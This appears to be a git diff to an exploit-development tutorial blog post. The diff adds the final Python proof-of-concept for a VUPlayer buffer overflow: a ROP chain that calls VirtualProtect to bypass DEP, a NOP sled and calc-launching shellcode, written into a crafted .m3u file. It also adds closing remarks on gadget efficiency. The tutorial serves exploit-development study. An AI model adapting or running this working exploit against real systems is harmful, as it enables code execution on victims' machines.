@@ -32,6 +32,8 @@ FuzzySec also has a phenomenal post [here](https://www.fuzzysecurity.com/tutoria
 
 You need to read and understand these blog posts very well in order to keep up. I will do my best to step through the process with the reader; however, it's always best to consult multiple sources and Corelan and Fuzzy are much more experienced and knowledgeable than I am. 
 
+Seriously, go read those two blogs, like now. 
+
 ## Getting Started
 In order to save time from scanning through Exploit DB for a suitable PoC and recreating the exploit, I found this [blog post by Steven Patterson](https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html) and used the same vulnerable program. We will not be consulting the blog post for help on our ROP chain, simply using the same vulnerable program which you can download from [ExploitDB](https://www.exploit-db.com/exploits/40018). Afterwards, we can compare ROP chains and see if there were any areas we could've been more efficient. 
 
@@ -761,3 +763,114 @@ rop += pushad
 Let's run our script and see if our function call is correct. 
 
 ![](/assets/images/AWE/protect.JPG)
+
+Awesome, it's perfect. The only thing left to do now is add shellcode and a NOP sled. Keep in mind the value we used for the `dwSize` argument is specific to our needs. If you want to plug in some large shellcode, perhaps change this value. 
+
+Our final POC script looks like this:
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop {COMPLETE}                                                 
+# ECX <writeable pointer> => flProtect {COMPLETE}                                 
+# EDX 00000040 => flNewProtect {COMPLETE}                                   
+# EBX 00000201 => dwSize {COMPLETE}                                             
+# ESP ???????? => Leave as is {COMPLETE}                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..) {COMPLETE}                  
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C {COMPLETE}
+# EDI 10101008 => ROP-Nop same as EIP {COMPLETE}
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+# EDX Chunk Affects: EAX, EDX
+edx = struct.pack('<L', 0x106074f8) # a pointer to # XOR EAX,EAX # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
+
+# EBX Chunk Affects: EAX, EBX
+ebx = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+ebx += struct.pack('<L', 0x994801bc)    # once XOR'd w the static value 994803BD, this will result in 0x201
+ebx += struct.pack('<L', 0x1003a074)    # a pointer to # XOR EAX,994803BD # RETN
+ebx += struct.pack('<L', 0x10032f32)    # a pointer to # XCHG EAX,EBX # RETN 0x00
+
+# EBP Chunk Affects: EBP
+ebp = struct.pack('<L', 0x10017c0d) # a pointer to a # POP EBP # RETN 0x04
+ebp += struct.pack('<L', 0x1010539F)    # pointer to JMP ESP
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+
+# ESI Chunk Affects: EAX, ESI
+esi = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+esi += struct.pack('<L', 0x1060E25C)    # virtual protect pointer 
+esi += struct.pack('<L', 0x1001eaf1)    # a pointer to # MOV EAX,DWORD PTR DS:[EAX] # RETN
+esi += struct.pack('<L', 0x10030950)    # a pointer to # XCHG EAX,ESI # RETN
+
+# EDI Chunk Affects: EDI
+edi = struct.pack('<L', 0x100190b0) # pointer to a # POP EDI # RETN
+edi += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP
+
+# PUSHAD Chunk
+pushad = struct.pack('<L', 0x1001d7a5)  # pointer to a # PUSHAD # RETN
+
+rop = edx
+rop += esi
+rop += ebx 
+rop += ebp
+rop += edi
+rop += eax
+rop += ecx
+rop += pushad 
+
+nops = "\x90" * 16
+
+calc = ("\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
+"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
+"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
+"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
+"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
+"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop 
+fuzz += nops
+fuzz += calc
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
+
+## Improvements
+Consulting [Steven Patterson's blog](https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html), there was really only one techinque that we really could've used to save space. He uses a `NEG` instruction in this gadget `0x10014db4 :  # NEG EAX # RETN` to craft his `0x40` and `0x201` values in EAX. Very clever and something we will use going forward. 
+
+## Conclusion
+Mona will actually craft large chunks of your chain for you; however, I wanted to steer clear of this as we'll need experience crafting custom chains in the future. 
+
+Huge thanks to Steven Patterson, FuzzySec, and Corelan for their wonderful blog posts. Any time you can create free content for people to learn from, it does wonders for beginners, it's much appreciated. 
